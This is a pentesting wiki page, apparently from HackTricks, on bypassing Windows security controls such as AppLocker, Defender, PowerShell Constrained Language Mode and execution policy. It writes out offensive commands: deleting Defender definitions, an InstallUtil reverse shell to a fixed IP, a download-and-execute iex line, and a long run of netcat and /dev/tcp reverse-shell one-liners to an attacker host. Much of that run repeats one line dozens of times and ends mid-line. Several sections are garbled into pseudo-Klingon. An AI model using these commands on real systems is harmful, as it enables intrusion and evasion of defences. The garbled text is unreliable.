# Windows Security Controls

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## AppLocker Policy

An application whitelist is a list of approved software applications or executables that are allowed to be present and run on a system. The goal is to protect the environment from harmful malware and unapproved software that does not align with the specific business needs of an organization.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) is Microsoft's **application whitelisting solution** and gives system administrators control over **which applications and files users can run**. It provides **granular control** over executables, scripts, Windows installer files, DLLs, packaged apps, and packed app installers.\
It is common for organizations to **block cmd.exe and PowerShell.exe** and write access to certain directories, **but this can all be bypassed**.

### Check

Check which files/extensions are blacklisted/whitelisted:
```powershell
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
### Bypass

* **Writable folders** to bypass AppLocker Policy: If AppLocker is allowing to execute anything inside `C:\Windows\System32` or `C:\Windows` there are **writable folders** you can use to **bypass this**.

### qIj

* **Writable folders** to bypass AppLocker Policy: If AppLocker is allowing to execute anything inside `C:\Windows\System32` or `C:\Windows` there are **writable folders** you can use to **bypass this**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
* **"LOLBAS's"** binaries that are commonly **trusted** can be useful to bypass AppLocker.
* **Poorly written rules could also be bypassed**
* For example, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, you can create a **folder called `allowed`** anywhere and it will be allowed.
* Organizations also often focus on **blocking the `%System32%\WindowsPowerShell\v1.0\powershell.exe` executable**, but forget about the **other** [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell\_Executables\_File\_System\_Locations) such as `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` or `PowerShell_ISE.exe`.
* **DLL enforcement very rarely enabled** due to the additional load it can put on a system, and the amount of testing required to ensure nothing will break. So using **DLLs as backdoors will help bypassing AppLocker**.
* You can use [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) or [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) to **execute Powershell** code in any process and bypass AppLocker. For more info check: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Credentials Storage

### Security Accounts Manager (SAM)

Local credentials are present in this file, the passwords are hashed.

### Local Security Authority (LSA) - LSASS

The **credentials** (hashed) are **saved** in the **memory** of this subsystem for Single Sign-On reasons.\
**LSA** administrates the local **security policy** (password policy, users permissions...), **authentication**, **access tokens**...\
LSA will be the one that will **check** for provided credentials inside the **SAM** file (for a local login) and **talk** with the **domain controller** to authenticate a domain user.

The **credentials** are **saved** inside the **process LSASS**: Kerberos tickets, hashes NT and LM, easily decrypted passwords.

### LSA secrets

LSA could save in disk some credentials:

* Password of the computer account of the Active Directory (unreachable domain controller).
* Passwords of the accounts of Windows services
* Passwords for scheduled tasks
* More (password of IIS applications...)

### NTDS.dit

It is the database of the Active Directory. It is only present in Domain Controllers.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft\_Defender) is an Antivirus that is available in Windows 10 and Windows 11, and in versions of Windows Server. It **blocks** common pentesting tools such as **`WinPEAS`**. However, there are ways to **bypass these protections**.

### Check

To check the **status** of **Defender** you can execute the PS cmdlet **`Get-MpComputerStatus`** (check the value of **`RealTimeProtectionEnabled`** to know if it's active):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

To enumerate it you could also run:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Encrypted File System (EFS)

EFS secures files through encryption, utilizing a **symmetric key** known as the **File Encryption Key (FEK)**. This key is encrypted with the user's **public key** and stored within the encrypted file's $EFS **alternative data stream**. When decryption is needed, the corresponding **private key** of the user's digital certificate is used to decrypt the FEK from the $EFS stream. More details can be found [here](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Decryption scenarios without user initiation** include:

- When files or folders are moved to a non-EFS file system, like [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), they are automatically decrypted.
- Encrypted files sent over the network via SMB/CIFS protocol are decrypted prior to transmission.

This encryption method allows **transparent access** to encrypted files for the owner. However, simply changing the owner's password and logging in will not permit decryption.

**Key Takeaways**:
- EFS uses a symmetric FEK, encrypted with the user's public key.
- Decryption employs the user's private key to access the FEK.
- Automatic decryption occurs under specific conditions, like copying to FAT32 or network transmission.
- Encrypted files are accessible to the owner without additional steps.

### Check EFS info

Check if a **user** has **used** this **service** checking if this path exists:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Check **who** has **access** to the file using cipher /c \<file>\
You can also use `cipher /e` and `cipher /d` inside a folder to **encrypt** and **decrypt** all the files

### Decrypting EFS files

#### Being Authority System

This way requires the **victim user** to be **running** a **process** inside the host. If that is the case, using a `meterpreter` sessions you can impersonate the token of the process of the user (`impersonate_token` from `incognito`). Or you could just `migrate` to process of the user.

#### Knowing the users password

{% embed url="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files" %}

## Group Managed Service Accounts (gMSA)

Microsoft developed **Group Managed Service Accounts (gMSA)** to simplify the management of service accounts in IT infrastructures. Unlike traditional service accounts that often have the "**Password never expire**" setting enabled, gMSAs offer a more secure and manageable solution:

- **Automatic Password Management**: gMSAs use a complex, 240-character password that automatically changes according to domain or computer policy. This process is handled by Microsoft's Key Distribution Service (KDC), eliminating the need for manual password updates.
- **Enhanced Security**: These accounts are immune to lockouts and cannot be used for interactive logins, enhancing their security.
- **Multiple Host Support**: gMSAs can be shared across multiple hosts, making them ideal for services running on multiple servers.
- **Scheduled Task Capability**: Unlike managed service accounts, gMSAs support running scheduled tasks.
- **Simplified SPN Management**: The system automatically updates the Service Principal Name (SPN) when there are changes to the computer's sAMaccount details or DNS name, simplifying SPN management.

The passwords for gMSAs are stored in the LDAP property _**msDS-ManagedPassword**_ and are automatically reset every 30 days by Domain Controllers (DCs). This password, an encrypted data blob known as [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), can only be retrieved by authorized administrators and the servers on which the gMSAs are installed, ensuring a secure environment. To access this information, a secured connection such as LDAPS is required, or the connection must be authenticated with 'Sealing & Secure'.

![https://cube0x0.github.io/Relaying-for-gMSA/](../.gitbook/assets/asd1.png)

You can read this password with [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
**[QaStaHvIS lo'laHbe'](https://cube0x0.github.io/Relaying-for-gMSA/)**

'ej, **NTLM relay attack** **qar'a'** **gMSA** **password** **cha'logh** **web page** [qaStaHvIS](https://cube0x0.github.io/Relaying-for-gMSA/) **chel**.

## LAPS

**Local Administrator Password Solution (LAPS)**, [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899) **download** **jatlh**, **local Administrator passwords** **management** **jatlh**. **randomized**, **unique**, **regularly changed** **passwords** **centrally** **stored** **Active Directory**. **passwords** **access** **authorized users** **ACLs** **restricted**. **permissions** **granted**, **local admin passwords** **read** **capability**.

{% content-ref url="active-directory-methodology/laps.md" %}
[laps.md](active-directory-methodology/laps.md)
{% endcontent-ref %}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **locks down many of the features** needed to use PowerShell effectively, such as blocking COM objects, only allowing approved .NET types, XAML-based workflows, PowerShell classes, and more.

### **Check**
```powershell
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass

#### Description

A bypass is a technique used to circumvent or evade security measures in order to gain unauthorized access or perform malicious activities. In the context of authentication, a bypass refers to methods that allow an attacker to bypass the authentication process and gain access to a system or application without providing valid credentials.

#### UAC Bypass

User Account Control (UAC) is a security feature in Windows that helps prevent unauthorized changes to the system. However, there are several techniques that can be used to bypass UAC and gain elevated privileges. Some common UAC bypass techniques include:

- **DLL Hijacking**: This technique involves replacing a legitimate DLL file with a malicious one that is loaded by a trusted application, allowing the attacker to execute arbitrary code with elevated privileges.

- **Fileless UAC Bypass**: This technique leverages the Windows Event Viewer to execute a malicious script without triggering UAC prompts.

- **Token Manipulation**: By manipulating access tokens, an attacker can bypass UAC and gain elevated privileges.

#### EFS Bypass

Encrypting File System (EFS) is a feature in Windows that allows users to encrypt files and folders to protect sensitive data. However, there are techniques that can be used to bypass EFS and gain access to encrypted files. Some common EFS bypass techniques include:

- **Cold Boot Attack**: This technique involves extracting encryption keys from the computer's memory after a cold reboot, bypassing the need for the user's password.

- **Password Cracking**: If the user's password is weak or easily guessable, an attacker can use password cracking techniques to gain access to encrypted files.

- **Key Escrow**: In some cases, encryption keys may be stored in a key escrow system, allowing authorized individuals to bypass EFS and access encrypted files.

#### Conclusion

Bypass techniques can be used by attackers to circumvent security measures and gain unauthorized access to systems or applications. It is important for organizations to implement strong security controls and regularly update their systems to mitigate the risk of bypass attacks.
```powershell
#Easy bypass
Powershell -version 2
```
**QaStaHvIS Windows** vaj **Bypass** vItlhutlh. **'ej** [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM) **vaj**.

**'ej** _**'oH**_ -> _Browse_ -> _Browse_ -> `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` **'ej** **.Net4.5** **lo'laH**.
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Qa'Hom 'ej Qa'Hom: 

```bash
nc -e /bin/sh <attacker IP> <port>
```

```bash
bash -i >& /dev/tcp/<attacker IP>/<port> 0>&1
```

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker IP> <port> >/tmp/f
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
nc -e /bin/bash <attacker IP> <port>
```

```bash
ncat <attacker IP> <port> -e /bin/bash
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <port> 0/tmp/p
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc <att
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
**ReflectivePick** (https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) or **SharpPick** (https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) jatlh **Powershell** code vItlhutlh process 'ej bypass the constrained mode. **Info** laH check: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## PS Execution Policy

**restricted.** vItlhutlh 'ej bypass policy:
```powershell
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
More can be found [here](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

## Security Support Provider Interface (SSPI)

**SSPI** jatlh API'e'chugh, qaStaHvIS lo'laHbe'chugh users authenticate.

**SSPI** qaStaHvIS yIqaw, cha'logh cha'logh machin'e'pu' cha'logh protocol leghlaHbe'chugh. **Kerberos** jatlh protocol'e'chugh yIqaw. **SSPI** jatlh authentication protocol leghlaHbe'chugh negotiate, 'ej 'oH cha'logh Windows machin'e'pu' DLL'e'chugh jatlh Security Support Provider (SSP) leghlaHbe'chugh, 'ej cha'logh machin'e'pu' cha'logh SSP jatlhbe'chugh yIqaw.

### Main SSPs

* **Kerberos**: jatlhbe'chugh
* %windir%\Windows\System32\kerberos.dll
* **NTLMv1** 'ej **NTLMv2**: Compatibility reasons
* %windir%\Windows\System32\msv1\_0.dll
* **Digest**: Web servers 'ej LDAP, password in form of a MD5 hash
* %windir%\Windows\System32\Wdigest.dll
* **Schannel**: SSL 'ej TLS
* %windir%\Windows\System32\Schannel.dll
* **Negotiate**: jatlhbe'chugh protocol negotiate (Kerberos 'ej NTLM, Kerberos jatlhbe'chugh default)
* %windir%\Windows\System32\lsasrv.dll

#### negotiation vItlhutlh

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) jatlh feature'e', **consent prompt for elevated activities** enable.

{% content-ref url="windows-security-controls/uac-user-account-control.md" %}
[uac-user-account-control.md](windows-security-controls/uac-user-account-control.md)
{% endcontent-ref %}

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) jatlh **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

***

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
